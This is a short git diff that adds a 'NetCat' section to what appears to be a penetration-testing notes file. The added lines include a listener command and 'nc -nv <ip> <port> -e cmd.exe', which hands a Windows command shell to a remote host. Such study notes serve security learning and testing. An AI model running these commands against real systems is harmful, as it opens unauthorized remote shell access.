@@ -134,3 +134,20 @@ its more clean and faster as the other ones
     -SNMP
     -SMTP
 
+**NetCat**
+
+try connect to an open port
+    
+    nc -nv <ip> <port>
+
+listening shell
+
+    nc -nvlp <port>
+
+connect
+
+    nc -nv <ip> <port> -e cmd.exe
+    -e execute
+
+
+
